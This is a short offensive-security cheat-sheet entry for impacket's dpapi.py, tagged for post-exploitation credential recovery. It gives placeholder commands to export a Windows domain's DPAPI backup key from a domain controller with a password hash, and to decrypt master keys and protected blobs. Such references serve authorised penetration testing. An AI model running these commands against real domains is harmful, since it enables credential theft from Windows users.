# dpapi (imp)
% impacket-secrets, dpapi
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 

## desc
```
DAPPI offile decryption tool
```

## dump the domain backup key
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```bash
dpapi.py backupkeys --export -hashes <nt_hash>  -t  <domain_fqdn>/<user|Administrator>@<dc_ip>
```

## identify master key Guid
#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```bash
dpapi.py unprotect -file <blob_file>
```

## decrypt master key (creds)
```bash
dpapi.py masterkey -file <master_key_file> -password <password> -sid <user_sid>
```

## decrypt blob (creds)
```bash
dpapi.py unprotect -file <blob_file> -key <decrypted_master_key>
```